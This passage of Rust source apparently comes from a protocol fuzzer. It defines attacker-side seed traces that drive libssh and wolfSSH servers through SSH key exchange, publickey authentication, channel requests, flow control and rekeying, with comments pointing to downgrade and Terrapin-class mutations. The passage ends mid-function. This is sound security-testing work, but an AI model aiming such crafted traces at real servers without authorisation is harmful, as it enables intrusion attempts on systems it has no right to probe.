        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    let sig = term! {
        fn_sign_userauth((fn_session_id_from_hash((@exch_hash))), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_auto))
    };
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_channel_id_0), (fn_window_size_default), (fn_max_packet_size_default),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_auto))
    };
    // s2c key/iv (to DECRYPT the server's output) + the channel number THIS server
    // assigned. libssh and wolfSSH pick different channel numbers, so the client
    // reads each stack's real number from its CHANNEL_OPEN_CONFIRMATION and
    // addresses subsequent channel traffic to it — otherwise the traffic hits a
    // channel the stack doesn't own and is silently dropped (a hard-coded
    // recipient_channel = 0 is only routed by the stack that happened to pick 0).
    // The query resolves per-PUT in the differential, so the SAME trace routes to
    // libssh's channel on the libssh run and wolfSSH's on the wolfSSH run.
    let key_s2c = term! { fn_derive_aes_key_s2c((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv_s2c = term! { fn_derive_iv_s2c((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let chan = term! { fn_s2c_confirmation_sender_channel(((server, *)/RawSshMessageFlight), (@key_s2c), (@iv_s2c)) };

    // Connection-protocol traffic on the server-assigned channel (see `chan`).
    let win_adjust = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_window_adjust((@chan), (fn_u32_0x10000))), (@key), (@iv), (fn_u32_auto))
    };
    // Mutable byte payload (fn_ssh_bytes over a Vec<u8> leaf): bit-level havoc
    // grows/shrinks/flips the bytes and the DY mutator can swap the leaf — the
    // entry point for fuzzing the peer's post-auth channel-data parser.
    let chan_data = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_data((@chan), (fn_ssh_bytes((fn_channel_payload))))),
            (@key), (@iv), (fn_u32_auto))
    };
    let chan_ext_data = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_extended_data((@chan), (fn_extended_data_stderr), (fn_ssh_bytes((fn_channel_payload))))),
            (@key), (@iv), (fn_u32_auto))
    };
    let chan_eof = term! {
        fn_encrypt_packet_aesgcm((fn_channel_eof((@chan))), (@key), (@iv), (fn_u32_auto))
    };
    let chan_close = term! {
        fn_encrypt_packet_aesgcm((fn_channel_close((@chan))), (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            OutputAction::new_step(server), // SERVICE_ACCEPT
            InputAction::new_step(server, term! { @auth_req }),
            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
            InputAction::new_step(server, term! { @chan_open }),
            OutputAction::new_step(server), // CHANNEL_OPEN_CONFIRMATION
            InputAction::new_step(server, term! { @win_adjust }),
            InputAction::new_step(server, term! { @chan_data }),
            InputAction::new_step(server, term! { @chan_ext_data }),
            InputAction::new_step(server, term! { @chan_eof }),
            InputAction::new_step(server, term! { @chan_close }),
            OutputAction::new_step(server), // CHANNEL_CLOSE
        ],
        ..Default::default()
    }
}

/// Session-requests seed: after publickey login, drive several
/// request/response round-trips on ONE session, each answered by its own s2c
/// flight — instead of a single post-auth burst:
///
///   1. `CHANNEL_OPEN` session → `CHANNEL_OPEN_CONFIRMATION` (its `sender_channel` is read back and
///      addresses every later channel message)
///   2. `CHANNEL_REQUEST` exec, want_reply → `CHANNEL_SUCCESS`
///   3. `GLOBAL_REQUEST` with an unknown name, want_reply → `REQUEST_FAILURE` (RFC 4254 §4: an
///      unrecognised want_reply request MUST be refused)
///   4. `CHANNEL_EOF` → the server's own `CHANNEL_EOF`
///   5. `CHANNEL_CLOSE` → the server's `CHANNEL_CLOSE`
///
/// No `CHANNEL_DATA` round-trip: plain data has no reply common to both stacks.
/// libssh credits the window (`WINDOW_ADJUST`) as soon as the harness consumes
/// the data, while wolfSSH only adjusts once its channel input buffer is over half
/// full or the window hits 0 (`_UpdateChannelWindow`) — a benign flow-control
/// policy difference, not a harness artifact. (`seed_client_attacker_channel_data`
/// is 0-diff because its EXTENDED_DATA makes wolfSSH adjust immediately too.)
///
/// Every c2s packet counter is the `fn_u32_auto` sentinel (renumbered to its wire
/// position by `preprocess_trace`), so step-deleting / reordering mutations keep
/// the GCM nonces valid: the mutator can drop, repeat or reorder whole
/// round-trips (e.g. a channel request before the open or after the close)
/// and the server still decrypts and PROCESSES them. One session channel only:
/// the libssh server harness accepts a single session channel, so a second one
/// would diverge on a harness choice, not a library difference.
/// AES-256-GCM; key A publickey login.
pub fn seed_client_attacker_session_requests(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    let sig = term! {
        fn_sign_userauth((fn_session_id_from_hash((@exch_hash))), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_auto))
    };
    // Round-trip 1: open the session channel.
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_channel_id_0), (fn_window_size_default), (fn_max_packet_size_default),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_auto))
    };
    // The channel number THIS server assigned, read from its decrypted
    // CHANNEL_OPEN_CONFIRMATION (per-PUT in the differential; see
    // `seed_client_attacker_channel_data`).
    let key_s2c = term! { fn_derive_aes_key_s2c((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv_s2c = term! { fn_derive_iv_s2c((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let chan = term! { fn_s2c_confirmation_sender_channel(((server, *)/RawSshMessageFlight), (@key_s2c), (@iv_s2c)) };

    // Round-trip 2: exec request on that channel, want_reply.
    let chan_exec = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_request((@chan), (fn_channel_exec), (fn_true),
                                (fn_exec_payload((fn_exec_command_userauth))))),
            (@key), (@iv), (fn_u32_auto))
    };
    // Round-trip 3: a connection-level request no stack recognises.
    let unknown_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_global_request((fn_request_unknown), (fn_true), (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_auto))
    };
    // Round-trips 4-5: a bidirectional EOF / CLOSE teardown.
    let chan_eof = term! {
        fn_encrypt_packet_aesgcm((fn_channel_eof((@chan))), (@key), (@iv), (fn_u32_auto))
    };
    let chan_close = term! {
        fn_encrypt_packet_aesgcm((fn_channel_close((@chan))), (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            OutputAction::new_step(server), // SERVICE_ACCEPT
            InputAction::new_step(server, term! { @auth_req }),
            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
            InputAction::new_step(server, term! { @chan_open }),
            OutputAction::new_step(server), // CHANNEL_OPEN_CONFIRMATION
            InputAction::new_step(server, term! { @chan_exec }),
            OutputAction::new_step(server), // CHANNEL_SUCCESS, command output
            InputAction::new_step(server, term! { @unknown_req }),
            OutputAction::new_step(server), // REQUEST_FAILURE
            InputAction::new_step(server, term! { @chan_eof }),
            InputAction::new_step(server, term! { @chan_close }),
            OutputAction::new_step(server), // CHANNEL_CLOSE
        ],
        ..Default::default()
    }
}

/// Rekey seed: complete the first key exchange, then drive a **client-initiated
/// rekey** (RFC 4253 §9) by sending — encrypted under the first set of keys — a
/// second KEXINIT, a second ECDH_INIT (reusing our ephemeral), and a second
/// NEWKEYS. This exercises the server's re-KEX state machine while a session is
/// already established: KEXINIT dispatch mid-session, rekey entry, a second ECDH,
/// and the second NEWKEYS key switch — a large code path no handshake-only seed
/// reaches, and the area where strict-kex re-arming / Terrapin-class issues live.
/// We don't send post-rekey traffic (that would need the re-derived keys), so the
/// whole rekey handshake rides on the first keys, which is correct: KEXINIT2 /
/// ECDH_INIT2 / NEWKEYS2 are all sent under the old cipher (NEWKEYS2 is the last
/// packet before the switch). AES-256-GCM, c2s counter = packet index since the
/// first NewKeys.
pub fn seed_client_attacker_rekey(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    // libssh's packet filter only permits a rekey KEXINIT once the connection is
    // established, so authenticate first (publickey, key A; counters 0,1).
    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    let sig = term! {
        fn_sign_userauth((fn_session_id_from_hash((@exch_hash))), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_auto))
    };

    // Rekey handshake, encrypted under the first keys (c2s counters 2,3,4). The
    // rekey KEXINIT is synthesized bottom-up from algorithm-name atoms (like
    // seed_client_attacker_full_kexinit_synth) so its name-lists are mutable
    // sub-terms: this exposes the server's *re-KEX* negotiation to downgrade /
    // strict-kex-rearm / Terrapin-class mutations mid-session, a code path a
    // fixed rekey KEXINIT cannot reach. The clean algorithm set matches the
    // first handshake so the rekey still completes on an un-mutated run.
    //
    // NOTE: sending post-rekey *traffic* (encrypted under the re-derived keys, to
    // prove the switch took) would require the server's SECOND KexEcdhReply — but
    // that is s2c-encrypted and only flushed when the server processes rekey_newkeys,
    // the same flush/decryption wall documented for the channel-number query. So
    // this seed drives the re-KEX handshake but stops at rekey_newkeys.
    let rekey_kexinit = term! {
        fn_encrypt_packet_aesgcm(
            (fn_kex_init(
                (fn_cookie_zeros),
                (fn_kex_algos((fn_namelist_1((fn_algo_curve25519_sha256))))),
                (fn_sig_schemes((fn_namelist_2((fn_algo_rsa_sha2_512), (fn_algo_rsa_sha2_256))))),
                (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
                (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
                (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
                (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
                (fn_comp_algos((fn_namelist_1((fn_algo_none))))),
                (fn_comp_algos((fn_namelist_1((fn_algo_none)))))
            )),
            (@key), (@iv), (fn_u32_auto))
    };
    let rekey_ecdh_init = term! {
        fn_encrypt_packet_aesgcm(
            (fn_kex_ecdh_init((fn_client_ecdh_pubkey))), (@key), (@iv), (fn_u32_auto))
    };
    let rekey_newkeys = term! {
        fn_encrypt_packet_aesgcm((fn_new_keys), (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            OutputAction::new_step(server), // SERVICE_ACCEPT
            InputAction::new_step(server, term! { @auth_req }),
            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
            InputAction::new_step(server, term! { @rekey_kexinit }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { @rekey_ecdh_init }),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { @rekey_newkeys }),
        ],
        ..Default::default()
    }
}

/// Publickey "query, then sign" (RFC 4252 §7), the flow real clients use: first a
/// USERAUTH_REQUEST WITHOUT signature asking whether key A is acceptable; the
/// server answers USERAUTH_PK_OK echoing the algorithm and key blob; the client
/// then signs for exactly the blob the server echoed (read back from the
/// decrypted s2c stream with `fn_decrypted_message` + `fn_pk_ok_blob`) and sends
/// the signed request. A mutated PK_OK or query therefore changes what gets
/// signed. Then a session channel is opened. AES-256-GCM, all counters auto.
pub fn seed_client_attacker_pubkey_query(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let sid = term! { fn_session_id_from_hash((@exch_hash)) };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@sid)) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@sid)) };
    let key_s2c = term! { fn_derive_aes_key_s2c((@shared), (@exch_hash), (@sid)) };
    let iv_s2c = term! { fn_derive_iv_s2c((@shared), (@exch_hash), (@sid)) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    // 1. The query: no signature.
    let query = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_query_data((fn_client_a_pubkey_blob)))
            )),
            (@key), (@iv), (fn_u32_auto))
    };
    // 2. The key blob the server says it would accept, from its PK_OK.
    let s2c = term! { (server, *)/RawSshMessageFlight };
    let pk_ok = term! {
        fn_decrypted_message((@s2c), (@key_s2c), (@iv_s2c), (fn_msg_userauth_pk_ok), (fn_ordinal_first))
    };
    let accepted_blob = term! { fn_pk_ok_blob((@pk_ok)) };
    // 3. Sign for that blob.
    let sig = term! {
        fn_sign_userauth((@sid), (fn_username), (fn_ssh_connection), (@accepted_blob))
    };
    let signed = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((@accepted_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_auto))
    };
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_channel_id_0), (fn_window_size_default), (fn_max_packet_size_default),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            OutputAction::new_step(server), // SERVICE_ACCEPT
            InputAction::new_step(server, term! { @query }),
            OutputAction::new_step(server), // USERAUTH_PK_OK
            InputAction::new_step(server, term! { @signed }),
            OutputAction::new_step(server), // USERAUTH_SUCCESS
            InputAction::new_step(server, term! { @chan_open }),
            OutputAction::new_step(server), // CHANNEL_OPEN_CONFIRMATION
        ],
        ..Default::default()
    }
}

/// Flow control from the server's own limits (RFC 4254 §5.1-5.2): open a session
/// channel, read the server's CHANNEL_OPEN_CONFIRMATION back from the decrypted s2c
/// stream, and send ONE CHANNEL_DATA of exactly min(window, max packet) it
/// advertised (libssh 32000 = its whole window; wolfSSH 32768), addressed to its
/// channel number. Each server's window / packet-size accounting is exercised at its
/// real boundary, and a mutated confirmation or budget changes what is sent. Then
/// EXTENDED_DATA, EOF, CLOSE as in `seed_client_attacker_channel_data` (the extended
/// data makes wolfSSH credit the window immediately too). All counters auto.
pub fn seed_client_attacker_flow_control(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let sid = term! { fn_session_id_from_hash((@exch_hash)) };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@sid)) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@sid)) };
    let key_s2c = term! { fn_derive_aes_key_s2c((@shared), (@exch_hash), (@sid)) };
    let iv_s2c = term! { fn_derive_iv_s2c((@shared), (@exch_hash), (@sid)) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    let sig = term! {
        fn_sign_userauth((@sid), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_auto))
    };
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_channel_id_0), (fn_window_size_default), (fn_max_packet_size_default),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_auto))
    };

    // The server's confirmation: its channel number and its send limits.
    let s2c = term! { (server, *)/RawSshMessageFlight };
    let confirm = term! {
        fn_decrypted_message((@s2c), (@key_s2c), (@iv_s2c), (fn_msg_channel_open_confirmation), (fn_ordinal_first))
    };
    let chan = term! { fn_sender_channel((@confirm)) };
    let budget = term! { fn_channel_send_budget((@confirm)) };

    let chan_data = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_data((@chan), (fn_ssh_bytes((fn_bytes_of_len((@budget))))))),
            (@key), (@iv), (fn_u32_auto))
    };
    let chan_ext_data = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_extended_data((@chan), (fn_extended_data_stderr), (fn_ssh_bytes((fn_channel_payload))))),
            (@key), (@iv), (fn_u32_auto))
    };
    let chan_eof = term! {
        fn_encrypt_packet_aesgcm((fn_channel_eof((@chan))), (@key), (@iv), (fn_u32_auto))
    };
    let chan_close = term! {
        fn_encrypt_packet_aesgcm((fn_channel_close((@chan))), (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            OutputAction::new_step(server), // SERVICE_ACCEPT
            InputAction::new_step(server, term! { @auth_req }),
            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
            InputAction::new_step(server, term! { @chan_open }),
            OutputAction::new_step(server), // CHANNEL_OPEN_CONFIRMATION
            InputAction::new_step(server, term! { @chan_data }),
            InputAction::new_step(server, term! { @chan_ext_data }),
            InputAction::new_step(server, term! { @chan_eof }),
            InputAction::new_step(server, term! { @chan_close }),
            OutputAction::new_step(server), // CHANNEL_CLOSE
        ],
        ..Default::default()
    }
}

/// COMPLETED rekey (RFC 4253 §9): the `seed_client_attacker_rekey` handshake, then
/// traffic under the NEW keys, which the attacker derives from what the server said
/// during the re-exchange — a real data dependency on post-KEX server replies.
///
/// The server's rekey KEXINIT and its second KEX_ECDH_REPLY arrive encrypted under
/// the FIRST keys; `fn_decrypted_message` recovers them from the s2c stream. From
/// them: K2 = ECDH(our ephemeral, Q_S2), H2 = hash(V_C, V_S, I_C2, I_S2, K_S, Q_C,
/// Q_S2, K2), and the new c2s key/IV from (K2, H2, session id = H1, unchanged by a
/// rekey, RFC 4253 §7.2). After NEWKEYS the attacker opens a session channel and
/// sends a want_reply global request with those keys (GCM counter restarts at 0).
/// A server that did not actually switch keys fails the tag on both packets.
/// AES-256-GCM, key A publickey login.
pub fn seed_client_attacker_rekey_complete(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let sid = term! { fn_session_id_from_hash((@exch_hash)) };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@sid)) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@sid)) };
    let key_s2c = term! { fn_derive_aes_key_s2c((@shared), (@exch_hash), (@sid)) };
    let iv_s2c = term! { fn_derive_iv_s2c((@shared), (@exch_hash), (@sid)) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    let sig = term! {
